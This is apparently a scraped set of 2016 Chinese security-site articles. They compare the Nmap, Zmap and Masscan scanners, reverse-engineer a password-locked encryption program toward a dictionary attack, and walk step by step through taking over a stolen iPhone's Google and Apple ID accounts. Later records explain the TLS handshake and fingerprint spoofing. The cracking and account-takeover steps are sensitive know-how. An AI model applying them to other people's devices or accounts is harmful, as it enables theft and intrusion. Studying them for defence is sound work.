为了配合用户的各种扫描需求，Masscan提供了重试次数、UA字段值、发出数据包的TTL值、发包后的等待时间等扫描设置。   Banner获取直接在扫描命令里使用—banners即可。NmapNmap的功能非常强大，而且作为一个广泛使用的开源工具，全球的开发者都为其功能的丰富贡献了力量。因此，本文仅对其功能进行简单的描述。        基本功能：主机发现，开放端口扫描，支持多端口、多网段，可对目标域名进行扫描；        识别功能：识别端口服务类型及版本、操作系统、设备类型等；        扫描模式：TCP SYN scan、TCP connectscan、UDP scan、No Ping scan等；        规避检测：分片、IP伪装、MAC伪装。三、扩展性ZmapZmap的扩展模块需使用C语言编写，官方提供了两个扩展模块用于获取Banner。1.      banner-grab-tcp       原理是向扫描发现的IP进行二次发包抓取Banner，二次发包的内容需要自定义。2.      forge-socket            功能与前者一样，但需要先安装驱动。该模块以底层驱动方式，效率更高。            除了以上两个扩展模块，用户也可以结合需求自行编写。NmapNmap有强大的脚本引擎框架，用户可以使用Lua语言编写扩展。目前官方提供了400多个扩展脚本，用于增强基础功能和扩展更多功能，如漏洞检测、口令爆破等。在扫描命令中使用—script=scriptname调用即可。四、速度和效率三种扫描工具在功能上各有长短，本文针对其最基本的端口扫描、主机发现功能进行了实验对比。实验环境         操作系统：CentOS 6.5             网络带宽：2000Kbps左右实验过程本文分别编写了三个Python脚本，执行扫描命令。选取来自美欧中非的几个网段，在一次扫描中，针对相同网段和15个常用端口进行扫描，并将结果最后转存到数据库中，对比Zmap、Masscan、Nmap三种工具在相同环境下执行扫描的速度和结果数量。实验结果 网段           Zmap      Masscan      Nmap  144.76.183.0/24      时间      11min43s      1min27s      7min39s  结果数量      323      315      317  125.56.212.0/24      时间      11min34s      54s      7min53s  结果数量      496      496      496  129.232.174.0/24      时间      11min24s      53s      15min55s  结果数量      416      427      429  125.71.28.0/24      时间      11min437s      50s      5min42s  结果数量      47      47      47  125.65.110.0/24      时间      11min39s      56s      4min55s  结果数量      275      254      275  134.213.61.0/24      时间      11min46s      56s      37min50s  结果数量      167      168      168  138.186.177.0/24 105.198.227.0/24           时间      22min34s      1min29s      2h18min47s  结果数量      363      183      368 时间方面，Zmap和Masscan扫描耗时与到扫描目标数量成正比，Zmap由于每次只能针对一个端口进行扫描，对于15个端口的情况需要在脚本中发起15次扫描，因此耗时高于Masscan；Nmap的耗时情况并不稳定，怀疑与目标网段网络环境有关。结果数量方面，在对一个C段进行扫描的时候，三种工具的主机发现数量差距不大；而在对两个C段进行扫描的实验中，Masscan出现了明显的遗漏。五、延伸工具Masscan         【Masscan Web Interface】可以导入XML文件，让用户方便地搜索扫描结果。Nmap         【Rainmap Lite】Web版Nmap，仅需安装Django，就可以建立新的扫描服务器，允许用户从他们的手机/平板电脑/网络浏览器启动Nmap扫描。         【Dracnmap】将Nmap复杂的命令进行一定程度的集成与简化，使新用户更加容易上手。         【LazyMap】可以自动进行Nmap扫描，并且能自动生成定制的Nessus策略。         【DNmap】Nmap的分布式版本，采用C/S结构，由服务器接受命令分发到客户端执行扫描。六、总结以上三种扫描工具各有利弊，工具的选取应该结合具体情况决定。Zmap和Masscan采用了无状态的扫描技术，扫描速度非常可观。在信息收集的初级阶段，可以使用Zmap或Masscan进行目标的情势了解，扫描单一端口的情况考虑使用Zmap，而多端口的情况下Masscan则更为快速。在做完初步了解之后，则应该使用功能更加丰富的Nmap进行进一步的详细扫描。七、参考文献https://github.com/robertdavidgraham/masscanhttps://zmap.io/documentation.htmlhttps://nmap.org/https://www.offensive-security.com/offsec/masscan-web-interface/http://www.freebuf.com/sectool/115782.htmlhttp://www.freebuf.com/sectool/117092.htmlhttp://www.freebuf.com/sectool/114701.htmlhttp://www.freebuf.com/sectool/29436.html","2016-11-11 16:45:45","安全工具","比一比Nmap、Zmap、Masscan三种扫描工具","http://nsoad.com/Security-tools/20161111/tools-747.html"
"5ccbfb3e4f2f0a0a7a69c134","前不久一朋友说忘了加密程序的密码，里面有很多重要信息，希望我能帮TA找回密码。心想不就是点一下“忘记密码”么，所以爽快答应了，然后就发生了接下来故事。0&","blackhold","前不久一朋友说忘了加密程序的密码，里面有很多重要信息，希望我能帮TA找回密码。心想不就是点一下“忘记密码”么，所以爽快答应了，然后就发生了接下来故事。0×01 前言当拿到加密文件后，瞬间傻眼。不是联网程序，就是一个孤零零的exe，压根没有“忘记 密码”这个选项，双击运行后，弹出那冷冰冰的对话框“please enter  password”，于是习惯性地进行了“人工智能弱密码破解”（手动穷举输入密码），一番折腾后，果断放弃了尝试。后背一阵冷汗后，还是硬着头皮上了， 谁让咱爽快的答应别人了哩。同时为了挑战一下自己，于是决定将这个程序进行逆向解析，彻底  ”爆”出里面的秘密，谁让咱是屌丝学僧哩，还要指望着修炼技术找工作呢。。。   0×02 猜想程序在用户输入密码后，会立刻判断出密码的对错，所以文件中存在”对比密钥”用于判断密码的正确性。对比密钥的几种形式：1.密码的明文；2.密码的散列值；3.使用密码和某一特征值生成对比密钥；4.使用密码和用户待加密的原数据生成对比密钥；5.………………0×03 信息收集第一步：样本设置第二步：文件静态分析选取样本1使用UE的检索功能搜索密码“123456”，未找到结果，可证明密码不是以明文形式存储。选取样本1为标准样本，使用UE的二进制对比功能，对比样本2、3、4与样本1的差异。将内容为空的加密程序用UE打开，最后一行行号为c9f0h。对比上述样本，可判断加密程序采用文件末尾追加数据的方式存储密文数据，进一步分析后得到数据存储格式。    第三步：IDA静态分析使用IDA加载样本1，弹出提示框。点击Ok，程序成功载入，但是函数窗口中只有一个函数，可见程序加了某种壳对IDA逆向分析产生了干扰。第四步：脱壳为减少调试中的干扰，进一步理清程序流程，需要进行脱壳处理。使用壳检测神器PEiD判断壳类型，结果如下：PEiD成功检测出壳名称为PECompact 2.x -&gt; Jeremy Collake ，如果是未知壳， 则需要进行手动脱壳。这里根据壳信息下载对应的脱壳程序对之前设置的四个样本程序进行脱壳处理。将脱壳后程序再进行IDA静态分析，函数窗口可获取到所有的函数信息，主程序流程图如下所示这密密麻麻的分支，让我再次一身冷汗第五步：动态调试使用OD进行动态调试分析，主要分析程序的密码比对流程。1、将样本1载入OD中，F9直接运行。此时，奇怪的事发生了，程序在弹出密码输入框的同时，OD左下角提示进程已经结束，这意味着程序已经运行结束，怎么密码框还在呢？！！！由此判断程序在运行时，创建了其他工作进程后结束了自身进程。打开任务管理器，可以看到如下疑似进程在运行。Kill掉这个进程后，密码框消失，可证明该线程为密码框工作线程。2、使用文件夹的搜索功能，对全盘进行了搜索，寻找该进程对应的程序存放目录。打开其对应的文件夹，可以看到有很多类似程序，这些都是测试时记事本生成的中间程序。3、运行这些程序，均为空白记事本，没有任何内容。经过UE比对确认，这些程序均为笔记本的原始程序，不包含任何数据。推测：记事本在运行时，先将原始程序释放在temp目录下，然后创建新进程加参数运行释放的程序。证明：使用OD查看程序调用的函数列表，找到创建进程的相关函数。这里确定kernel32库函数CreateProcessA，右键选择“查看引用”。407BAE处调用了该函数创建新进程，在407BAE下断点，运行程序程序确实是通过加参数的形式运行的，打开cmd，输入程序路径并且加参数运行程序弹出错误窗口，并不能正常运行弹出密码输入框。0×04深度分析获取上述基本信息后，确定了加密程序的数据存储格式和运行加载方式。下面采用OD附加进程的方式直接对运行后新创建的进程进行调试，来梳理密码判断流程。1、附加程序双击运行程序，打开OD-&gt;文件-&gt;附加，双击新进程名称，将OD附加上去，对其进行调试。由于此时新进程处于密码框输入状态，所以OD会停留在系统函数领空，此时密码框为不可 用状态。为了跟踪密码输入后的流程，需从密码输入后跟踪调试，使用Alt+F9程序会自动运行并停留在用户代码段。此时密码输入框处于激活状态，输入正确 的密码，点击确定，程序停留在用户代码段。2、IDA辅助查看程序流程在获取到密码输入后的关键地址后，使用IDA加载程序，使用F5反编译功能，查看程序的伪代码。可以看到While循环中第33行为密码输入框，37行调用函数404648进行了密 码正确性判断，39行为“Invalid  passphrase”密码错误信息。将OD定位到404648函数的调用处，可以看到函数的返回值eax决定了后续分支走向，这个值便是密码正确性判断 后产生的结果。找到密码判断的关键后，进入404648函数，查看返回值的生成过程，确定关键代码。repe cmps byte ptr [esi],byte ptr [edi]ESI为12FE78，EDI为3E3D99程序对两处0×20字节的数据进行比对，而这两个数据正是样本1中key中的前0×20字节的数据。可确定程序在获得输入密码后，经过一系列加密变换后生成0×20字节的key与文件中的密钥进行对比，来判断输入的密码是否正确。3、加密流程确定密钥判断关键位置后，继续向上追溯，寻找对比密钥生成过程。经过一番跟踪后，确定函数407481为对比密钥生成函数。size_t __usercall sub_407481@(int a1@, void *a2, size_t a3){  int v3; // edi@1  size_t result; // eax@1  int v5; // ebx@1  size_t v6; // ebx@7  v3 = *(_DWORD *)a1 &amp; 0x3F;  result = a3 + *(_DWORD *)a1;  v5 = 64 - v3;  *(_DWORD *)a1 = result;  if ( result &lt; a3 )    ++*(_DWORD *)(a1 + 4);  if ( v3 &amp;&amp; a3 &gt;= v5 )  {    memcpy_0((void *)(v3 + a1 + 40), a2, 64 - v3);    result = sub_404B4C(a1 + 40, a1);    a3 -= v5;    a2 = (char *)a2 + v5;    v3 = 0;  }  if ( a3 &gt;= 0x40 )  {    v6 = a3 &gt;&gt; 6;    do    {      result = sub_404B4C((int)a2, a1);      a3 -= 64;      a2 = (char *)a2 + 64;      --v6;    }    while ( v6 );  }  if ( a3 )    result = (size_t)memcpy_0((void *)(v3 + a1 + 40), a2, a3);  return result;}用OD在407481函数处下断点什么！！！！函数在执行时，参数1是明文内容，参数2是明文长度。可见在此之前，程序利用输入的密码对密文进行了解密，然后又将解密出的明文送入函数407481生成比对密钥。明文是如何解出来的，稍后再分析。先继续分析407481函数如何利用明文生成对比密钥。经调试后，确定函数404B4C为关键的加密函数。由于该函数非常复杂，所以并不打算对该加密算法进行深入分析，直接将该函数的汇编代码抠出来作为c程序的内嵌代码使用。404B4C函数的输入分别为eax（待加密的内容，长度为0×40字节），ecx（生成的密钥存放位置），ecx所指向的密钥存放位置为0×28字节，前8个字节存放着原始明文的总长度，后面0×20字节存储着生成密钥，且这0×20字节密钥设有初始值。407481函数输入：参数Arg1：原始明文地址参数Arg2：原始明文长度输出：  蓝色框中为原始明文长度红色框中为密钥变换后的结果绿色框为明文长度除以0×40后剩余的明文内容407481过程表示蓝色框中写入参数Arg2的值count = Arg2 / 0x40;          //明文长度除以0x40 data=Arg1;                While(count--)                {Call 404B4C(data);        //每次讲明文的0x40字节进行加密计算data=data+0x40;}Call 40B240(Arg2 %0x40 ,data);  //将明文的剩余部分写入绿色框中上述过程结束后，程序再次调用了407481函数，参数为原始加密文件中key2密钥，长度为0×10字节。407481函数运行后将0×10字节的密钥追加在了剩余明文尾部。随后的call 00407508函数会计算出0×20字节的对比密钥。经过分析，程序主要利用如下区域的数据进行对比密钥的生成。蓝色框：原始明文长度+末尾附加的数据长度红色框：密钥绿色框：剩余数据总结对比密钥生成过程：1.将红色区域初始化，将初始密钥写入2.每次读取0×40字节的原始数据，使用红色区域的密钥进行加密变换，生成的密钥输出到红色区域；3.将剩余的原始数据进行填充处理，使其达到0×40长度，然后再进行一次密钥变换，此时生成的密钥便是比对密钥，用于和正确的密钥进行比对。分析到这里我们发现，对比密钥的生成条件都是可以从文件数据中获取，但是有一个条件现在还不知道，那就是明文数据！！！我们似乎陷入了一个死循环中。。0×05密文解密1、猜想：程序在获取到输入密码后，利用输入密码对密文进行解密，用解密后的密文生成对比密钥。证明：继续回溯跟踪，确定404A6F地址处调用的call 0040854C函数是解密函数，参数1为密文内容，参数2为密文长度，参数3为文件中的key2密钥。40854C函数在解密过程中还调用了一些未知区域的数据进行解密变换2、猜想：程序在初始化运行时，生成了这些未知区域的数据。证明：重新运行程序，断在程序入口点处，查看数据区域41E340处，可见该区域均为0×00。 在此数据区域设置内存写入断点，F9运行。确定位置后用IDA反编译，可以清晰观察到程序通过调用408FFB函数向41B300，41BB00，41E340，41EB40，41C700，41CB00六个区域写入数据，每个区域长度为0×100。int sub_408FFB(){  int v0; // eax@1  int v1; // ecx@1  …………………………  v0 = 1;  v1 = 0;  do  {    v2 = 283 * (((unsigned int)v0 &gt;&gt; 7) &amp; 1);    *(int *)((char *)&amp;dword_41CF00 + v1) = v0;    v1 += 4;    v0 = v2 ^ 2 * v0;  }while ( (unsigned int)v1 &lt; 0x28 );  v28 = 0;  do  {    v3 = v28;    LOBYTE(v2) = v28;    v4 = sub_408F52(v1, v2);    v5 = 2 * (v4 ^ 2 * (v4 ^ 2 * (v4 ^ 2 * v4))) ^ v4;    v6 = (unsigned __int8)(v5 ^ BYTE1(v5) ^ 0x63);    v7 = 2 * v6 ^ 283 * (v6 &gt;&gt; 7) | ((v6 | (v6 &lt;&lt; 8))  &lt;&lt; 8) | 452984832 * (v6 &gt;&gt; 7) ^ ((v6 ^ 2 * v6) &lt;&lt; 24);    ……………………    v20 = 72448 * v17 ^ 72448 * v18 ^ 72448 * v19 ^ ((v14 ^ 8 * v14)  &lt;&lt; 8) | 18546688 * v17 ^ 18546688 * v15 ^ 18546688 * (((unsigned  int)v14 &gt;&gt; 6) &amp; 1) ^ 18546688 * v18 ^ 18546688 * v19 ^ ((v14 ^  4 * v16) &lt;&lt; 16) | 452984832 * ((unsigned int)v14 &gt;&gt; 7) ^  452984832 * v17 ^ 452984832 * v18 ^ 452984832 * v19 ^ ((v14 ^ 2 * (v14 ^  4 * v14)) &lt;&lt; 24) | 283 * ((unsigned int)v14 &gt;&gt; 7) ^ 283 *  v17 ^ 283 * v15 ^ 283 * (((unsigned int)v14 &gt;&gt; 6) &amp; 1) ^ 283 *  v18 ^ 283 * v19 ^ 2 * (v14 ^ 2 * v16);    ……………………    dword_41E340[v8] = v21;    dword_41EB40[v8] = v24;    dword_41C700[v8] = v1;    dword_41CB00[v8] = v26;  }  while ( v28 &lt; 0x100 );  dword_41FF58 = 1;  return 0;}0×06.解密流程0×07.后记根据上述分析后，可确定加密程序并非将密码存储在文件中，所以不能根据加密数据逆向推 导出原密码，而只能根据上述分析的密码验证流程采用字典攻击进行暴力破解。而这也正是很多加密程序需要使用字典进行暴力破解的原因。程序分析到这里，就该 写程序结合字典来“爆”出里面的秘密了。。。。。。","2016-07-29 14:30:41","网络安全","手把手教你找回加密程序的密码","http://nsoad.com/Article/Network-security/20160729/207.html"
"5ccbfb3e4f2f0a0a7a69c135","即使你的iPhone6S设置了六位数的密码，甚至还设置了touch ID，但我要告诉你的是：你的手机仍然能被犯罪分子解锁。事件背景三天前，一位苹果用户的iPhone6S被偷了。随后，小","Kong","即使你的iPhone6S设置了六位数的密码，甚至还设置了touch ID，但我要告诉你的是：你的手机仍然能被犯罪分子解锁。事件背景三天前，一位苹果用户的iPhone6S被偷了。随后，小偷重置了该用户某些在线服务的密码以及Apple ID。不仅如此，小偷还伪装成该用户与银行进行了联系，并试图重置该用户的银行账户密码。不过幸运的是，这个小偷并没有取出这些钱。那么问题来了，犯罪分子是如何在手机锁屏的情况下重置AppleID密码的呢？为了让大家更清楚地了解此次事件，我们收集整理了一些关于此次事件的信息，具体如下：a）这是不是一次针对性的攻击？我的意思是，小偷是不是通过网络钓鱼等诈骗手段盗取了受害者的信息，然后再专门偷走他的手机？这不太可能。根据我们收集到的信息，小偷在偷走受害者的手机之前没干任何事。b）在手机被盗之前，受害者其它的网络账户或个人信息被盗了吗？对于小偷来说，受害者的个人信息可是很重要的呢！然而，受害者的个人信息并没有被盗，小偷偷手机纯粹只是求财。c）小偷在盗得手机多久之后就解锁了iPhone和SIM卡？大概在手机被盗2个小时左右。d）iPhone的密码能猜出来吗？不太现实。六位数字密码并不是那么好猜的，而且受害者设置的密码与他的车牌号码或其它个人信息毫无关联。鉴于此次事件是如此的“不可思议”，我们决定对此进行深入分析，并让大家了解这部iPhone到底是如何被解锁的。事件脉络该用户的iPhone6S是在10月14日下午被偷的，我们对此次事件的发展脉络进行了梳理，具体如下：a)14:00-手机被盗；b)16:03-受害者激活了手机的“丢失模式”，并通过iCloud远程清除了手机数据；c)16:28-受害者的Google账户密码被修改了；d)16:37-受害者收到了一封电子邮件，邮件中包含了重置Apple ID密码的链接；e)16:38-受害者收到了一封新邮件，这封邮件通知他，他的Apple ID密码已被修改；f)16:43-受害者再次收到邮件，被告知他手机已成功定位；g)16:43-受害者收到了最后一封邮件，被告知这台手机中的数据已被清除；正如我们所见，受害者的Google和Apple账户的密码都被小偷重置了。正如我们所知，在没有手机密码的情况下，要解锁这台iPhone是不太可能的。那么，小偷是如何做到的呢？以下是我们所做的一些假设1）如果你要更改Google账户的密码，首先你得要知道电子邮箱的地址。然而，犯罪分子是如何获得受害者的邮箱地址的呢？尽管手机在锁屏状态下收到的信息和通知会显示在手机屏幕上，但用户的Gmail邮箱地址并没有办法显示出来。2）可以通过设备的IMEI码获取用户的Apple ID吗？我们在网上搜索了一下，确实发现了有些付费服务能够通过IMEI码获取Apple ID，但是得需要24-48小时才能获得你想要的信息。而犯罪分子只用了2个小时就将手机解锁了，由此可见，犯罪分子并不是通过设备的IMEI码获取到受害者的AppleID的。3）犯罪分子仅根据手机号就能获取用户的Gmail邮箱账号吗？我们发现，只要有以下几个信息就能获取Gmail邮箱地址——与邮箱账号绑定的手机号码和用户的姓名。既然手机偷到手了，手机号码自然也就知道了，通过手机号码获得用户的姓名也不是什么难事。因此，我们准备以此为切入点继续深入下去。情景还原我们决定根据上述方法找到用户姓名以验证我们的猜想。受害者为了搞清楚事情的来龙去脉也参与其中，还购买了一部新的iPhone6S，并且将新手机的设置调整成被盗手机一样。这样一来，受害者手机被盗的场景就能被最大化地还原了。获取关键信息为了获取手机号码，我们取出了iPhone中的SIM卡，然后把这张SIM卡插到了另一台手机中。与真实场景一样，SIM卡没有设置PIN码。所以，我们轻易地在另一台手机上获取了用户的手机号码。接下来，我们将用户的号码放到网上搜索，试图获取用户的姓名，但是这个方法行不通。一定还有根据手机号码就能获取用户姓名的办法，于是我就想到了WhatsApp！假如你在WhatsApp的一个群聊组中，并收到了陌生人的信息时，对方的名字和手机号就会显示在资料中（例如：9999-9999 ~MikeArnold）。所以，如果能用这个锁屏的iPhone向WhatsApp的聊天群发送一条信息，我们就能知道用户的姓名了。首先，我们要确保在锁屏状态下，这台iPhone接收到的WhatsApp通知信息能在锁屏界面上显示。于是我们向这台iPhone发了一条信息，这条信息果然显示在锁屏界面上了；下一步，我们需要在手机的锁屏状态下回复这条信息，只要使用3D touch功能就能实现这一步。于是我们创建了一个聊天群，并把受害者手机号所绑定的WhatsApp账号加入到这个群里，由于进入新群不需要任何验证信息，所以我们便在锁屏界面上看到了这条进群的通知信息。此外，我们还在群里加了一些与受害者毫无关联的陌生人。一切准备就绪，我们先在群里发了一条信息，这条信息也在锁屏界面上显示了；然后我们用3Dtouch功能回复了这条信息，果然不出所料，我们成功获取到了用户的姓名。下一步，只要将用户姓名和电话填到Google的表单中，我们就能获得用户的电子邮箱地址了。修改Google账户的密码现在，我们来试着还原犯罪分子修改Google账户密码的场景。- 进入Google的登录界面；- 选择“忘记密码”选项；- 在“你曾经使用过的密码”选项中随便填写一些数字或字母；- 接下来，Google会让你填写与账户绑定的手机号码；- 输入了手机号之后，Google会给绑定的手机发送一条验证码短信；- 输入了验证码之后，Google会要求我们设置新密码。由此看来，只要别人拿到了你的手机或SIM卡以及你的姓名，他就能轻松地修改你的Google账户密码了。修改Apple ID的密码下一步就是修改Apple ID密码了。与修改Google账户密码一样，进入登录界面后选择“忘记密码”选项，然后系统会把重置密码的链接通过邮件发到你的Gmail邮箱中。剩下的操作就简单多了，我们成功地修改了用户的Apple ID密码。解锁新的iPhone在iPhone手机被盗之后，大家第一时间想到的就是远程锁定手机并清除手机中的数据。但是，这几个步骤反而会帮助犯罪分子得到一台“新的”iPhone。原因是，当iPhone的数据被远程清除后，iPhone会要求你输入与设备绑定的Apple ID和密码，但假如犯罪分子用我们上面所述的办法获取到了AppleID和密码的话，那么犯罪分子就能将这台iPhone当成新手机来使用了。Freebuf温馨提示以下是我们针对本文中涉及到的安全问题所提出来的建议：1、禁止手机在锁屏状态下显示短信或其它通知的内容；2、为手机的SIM卡设置PIN码；Clipboard Image.png3、为你所使用的各种网络服务设置双因素身份验证。总结这次的事件值得我们深思，如果我们不为自己的智能手机做好足够的安全保护措施，那么我们损失的可不仅仅只是手机了。","2016-10-28 15:26:50","移动安全","一步一步教你如何解锁被盗的iPhone 6S","http://nsoad.com/Article/MobileSecurity/20161028/653.html"
"5ccbfb3e4f2f0a0a7a69c136","1.    协议介绍SSL/TLS是保护计算机网络通讯安全的一类加密协议，它们在传输层上给原先非安全的应用层协议提供加密保护，如非安全的HTTP协议即可被SSL/TLS保护形成安全的HT","Kong","1.    协议介绍SSL/TLS是保护计算机网络通讯安全的一类加密协议，它们在传输层上给原先非安全的应用层协议提供加密保护，如非安全的HTTP协议即可被SSL/TLS保护形成安全的HTTPS协议。SSL、TLS协议其实是有所差异的，TLS协议是继承了SSL协议并写入RFC，标准化后的产物。因此，通常使用SSL来指代SSL协议和TLS协议。SSL (Secure Socket Layer)安全套接字层协议• SSL通过互相认证、使用数字签名确保完整性、使用加密确保私密性，以实现客户端和服务器之间的安全通讯。• 分为SSL记录协议和SSL握手协议。TLS(Transport Layer Security)传输层安全协议• 用于两个应用程序之间提供保密性和数据完整性。• 分为TLS记录协议和TLS握手协议。 区别：• SSL是Netscape开发的专门用户保护Web通讯的，目前版本为3.0。• TLS 1.0是IETF(工程任务组)制定的一种新的协议，它建立在SSL 3.0协议规范之上，是SSL 3.0的后续版本。两者差别极小，可以理解为SSL 3.1，它是写入了RFC的2. SSL/TLS在TCP/IP协议栈的位置SSL/TLS协议在传输层上封装了应用层的数据，因此可以在不需要修改应用层协议的前提下给不安全的应用层协议提供一定的安全保障。3. SSL/TLS协议栈4. SSL/TLS协议运作流程5. SSL/TLS握手阶段抓包解析本次实验使用浏览器访问https://www.baidu.com，使用WireShark抓包获取其中的SSL/TLS握手阶段的数据包并简要分析。1) 客户端发送ClientHello客户端发起握手协商操作，它将发送一个ClientHello消息给服务器，消息中明确了其所支持的SSL/TLS版本、Cipher suite加密算法组合等，可以让服务器选择，并提供了一个客户端随机数，用于以后生成会话密钥使用。2) 服务器返回ServerHello服务器将返回一个ServerHello消息，该消息包含了服务器选择的协议版本、加密算法，以及服务器随机数、会话ID等内容。其中，服务器选择的协议版本应小于等于客户端ClientHello中的协议版本。本次实验中服务器确认使用TLS 1.2版本的协议，并选择TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256加密算法组合。3) 服务器发送Certificate服务器发送ServerHello消息，选择好协议版本和加密算法组合后，将发送Certificate消息，该消息包含了服务器的证书等信息，可通过证书链认证该证书的真实性。根据选择的加密算法组合的不同，服务器证书中的公钥也可被用于加密后面握手过程中生成的Premaster secret。4) 服务器发送ServerKeyExchange服务器发送ServerKeyExchange消息，消息中包含了服务器这边的EC Diffie-Hellman算法相关参数。此消息一般只在选择使用DHE 和DH_anon等加密算法组合时才会由服务器发出。5) 服务器发送ServerHelloDone服务器发送ServerHelloDone消息，告知客户端服务器这边握手相关的消息发送完毕。6) 客户端发送ClientKeyExchange客户端发送ClientKeyExchange消息，消息中包含客户端这边的EC Diffie-Hellman算法相关参数，然后服务器和客户端都可根据接收到的对方参数和自身参数运算出Premaster secret，为生成会话密钥做准备。7) 客户端发送ChangeCipherSpec客户端向服务器发送ChangeCipherSpec消息，通知服务器此消息以后客户端会以加密方式发送数据。8) 客户端发送Finished客户端使用之前握手过程中获得的服务器随机数、客户端随机数、Premaster secret计算生成会话密钥，然后使用该会话密钥加密之前所有收发握手消息的Hash和MAC值，发送给服务器，服务器将相同的会话密钥（使用相同方法生成）解密此消息，校验其中的Hash和MAC值。9) 服务器发送ChangeCipherSpec服务器发送ChangeCipherSpec消息，通知客户端此消息以后服务器会以加密方式发送数据。10) 服务器发送Finished服务器使用会话密钥加密（生成方式与客户端相同，使用握手过程中获得的服务器随机数、客户端随机数、Premaster secret计算生成）之前所有收发握手消息的Hash和MAC值，发送给客户端去校验。若客户端服务器都校验成功，握手阶段完成，双方将按照SSL记录协议的规范使用协商生成的会话密钥加密发送数据。6. 参考资料https://en.wikipedia.org/wiki/Transport_Layer_Securityhttp://www.cnblogs.com/happyhippy/archive/2007/05/14/746476.htmlhttp://blog.csdn.net/fw0124/article/details/40983787","2016-10-15 16:02:49","网络安全","传输层安全协议抓包分析之SSL/TLS","http://nsoad.com/Article/Network-security/20161015/570.html"
"5ccbfb3e4f2f0a0a7a69c137","手机设置了指纹加密就一定安全吗？下面就一起来了解一下吧。指纹加密已成主流无论是正面、背面、侧面三种位置，还是按压、刮擦、触摸三大分支，指纹识别技术已经悄悄进入","Kong","手机设置了指纹加密就一定安全吗？下面就一起来了解一下吧。指纹加密已成主流无论是正面、背面、侧面三种位置，还是按压、刮擦、触摸三大分支，指纹识别技术已经悄悄进入我们的生活圈，如今更是势如破竹，再结合软件之后，令其功能更加丰富。自苹果iPhone5s发布之后，指纹识别技术开始被人们所关注，那时这项科技给人的感觉是十分高大上，我们只需要用自己的手指便可以设定专属于自己的指纹密码。这种科技迅速走俏，不久许多安卓也发布了此项功能，甚至有媒体预测，在未来，指纹识别技术将成为智能手机的标配，我们每个人都可以轻松拥有专属于自己手心的密码锁。当密歇根州立大学教授Anil Jain受到警方邀请为其解锁三星Galaxy S6手机时，他后来接受福布斯采访时表示，当时也没有考虑到可以利用那么廉价的方案来解锁设备，而这套设备的价格不高于500美元，而利用该技术还可以解锁iPhone 6手机。而后负责此案的是密西根警局的探员Andrew Rathbun，他说他花了好几个小时思考及搜寻如何解锁被害人的手机，并未掌握破解手机密匙的方法。在查询“冒用指纹”时，跳出了密西根州立大学教授Anil Jain的名字，因而登门求助。在接受警方的委托后，他分别以2D及3D复制了死者10只手指的指纹，但首次尝试失败了，进而强化数位指纹的品质，最后用导电的墨水列印了2D版本的指纹并成功解锁。而在这个过程中，最难的是修复受害者的指纹，研究人员为此一共修改了三次但这次警方的运气不错，因为就算多次输入了错误的指纹，手机也未再要求输入确认密码。而当时当地警方并未过多透露相关细节。最后Jain表示：“手机上的指纹读取器是为了强化手机内的资讯安全，该团队的目的并非入侵手机，而是站在研究的角度看待指纹技术，希望此次的案例能够督促手机开发人员建立更安全的指纹侦测机制。”其实谈起指纹识别技术，有不少单位的上下班考勤制度都采用指纹打卡机的方式，还有计算机的指纹识别来确认登陆用户是否为本机用户。这里需要注意的是常说的指纹就是表皮上凸起的纹路，而根据人类基因的不同，每个人的指纹完全不相同，所以可以利用指纹对不同的两人进行区分。后来这种方式便被引入到智能手机，因为对应开锁的指纹只有你可以完成，手机安全和个人隐私都能得到有效的保护，于是这项技术就引起了足够多的重视。上面描述的案件中，探员 Rathbun后来对福布斯称：“希望这项技术可以成为一种新工具，并在全国乃至全世界范围内数字取证调查人员提供便捷。”在去年12月，28岁的赛耶德·法鲁克和妻子对加州圣伯纳迪诺一家社会服务机构发起袭击，造成14人死亡，两人在枪战中被警方击毙。而案发后，警方在其汽车上发现一部iPhone 5c手机。由于苹果在iPhone中使用了自己的加密技术，FBI也无法破解，当时苹果曾与美国司法部正为该问题而争执不休，而后又推迟举行听证会，后来有报道称，以色列移动法医软件开发商Cellebrite协助美国联邦调查局(FBI)解锁该手机，当时据Cellebrite网站信息显示，该公司可提供iPhone、Android、Windows和黑莓手机的数据提取服务，拥有解锁iOS 8.x设备来取证的能力，不需要任何硬件干预，也没有删除数据的风险。后来又有消息称，该公司并未为其提供解锁服务。那么看到现在，小伙伴认为手机加密就一定安全吗？不能否认，指纹识别器到手机系统之间的部分，是相当安全的。而参与上面两个案件的美国警方也是在绕过生物识别方面下足了功夫，当然失败也是在所难免的，本月，福布斯透露称，再采集一个人口贩子的指纹时，就出现了问题，但具体原因尚且不知。而从硬件到软件，指纹系统已经紧密连接起来，但指纹这个太常见了，手会和各种东西接触，于是手指皮肤分泌出的化学物质，让我们在各种各样的环境中都留下了指纹。1892年在阿根廷发生的一起血腥案件，最终警察通过指纹将罪犯绳之以法，于是便开启了指纹取证之路。指纹可以说是最方便的加密方式，手机不加密最方便但不安全，手机加密码安全但最不方便，而指纹正好处于两者之间，而指纹即使被破解，恐怕正如前面所说投入的时间、精力以及金钱怕是不少，这样不能保证窃密的投入与收益相当，指纹识别拉高了窃密成本和风险。而手机指纹加密的普及，对于上面描述的情况，指纹解密很有可能变成一种“万能”的破解方式，虽然现在手机加密方式多种多样，但随着各种移动支付的兴起，指纹识别可能会和移动支付紧密相连，那么指纹识也有可能形成一种产业链，毕竟指纹是生活中常见的一种东西，而从指纹搜集、破解也有可能会变成盗取他人钱财的一种方式，而这种安全也确实令人担忧。","2016-10-27 00:44:29","网络安全","万能手机破解的正确姿势","http://nsoad.com/Article/Network-security/20161027/640.html"
